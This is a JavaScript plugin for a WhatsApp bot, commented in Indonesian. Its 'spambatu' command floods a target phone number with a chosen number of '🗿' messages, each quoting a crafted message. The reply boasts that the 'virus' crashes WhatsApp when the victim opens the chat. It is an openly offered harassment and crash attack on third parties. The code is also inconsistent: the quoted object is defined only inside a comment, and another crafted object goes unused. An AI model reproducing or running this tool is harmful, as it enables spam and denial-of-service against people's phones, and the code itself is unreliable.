
import fetch from 'node-fetch'

let handler = async (m, { conn, text, command }) => {
if (!text) throw `*Jangan disalahgunakan yh*\n\nExample: ${command} 628XXXXXX/10`
let num = text.split('/')[0]+"@s.whatsapp.net"
let jumlah = text.split('/')[1]
await m.reply('Tunggu Sebentar...')

/*let dann = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": "SPAM CHAT",
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}*/

let fuk = {
    "key": {
      "participants": "0@s.whatsapp.net",
      "remoteJid": "status@broadcast",
      "fromMe": false,
      "id": ""
    },
    "message": {
      "contactMessage": {
        "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    },
    "participant": "0@s.whatsapp.net"
  }
  
for (let i = 0; i < jumlah; i++) {
  
let gmbr = await fetch('https://genix.eu.org/akebi.jpg')
    
//conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.ppmika }}}}, {})

conn.sendMessage(num, { text: '🗿'}, { quoted: dann })
}
m.reply(`Sukses Mengirim ${command}\nKe Nomor: ${text}\n\n*Note :* Virus ini aktif ketika korban membuka chat nya, maka WhatsApp akan crash hehe`)
}
handler.help = ['spambatu <nomer/jumlah>']
handler.tags = ['spam']
handler.command = /^(🗿|spambatu)$/i 
handler.premium = false
handler.restrict = true
handler.rowner = true
handler.diamond = 3
export default handler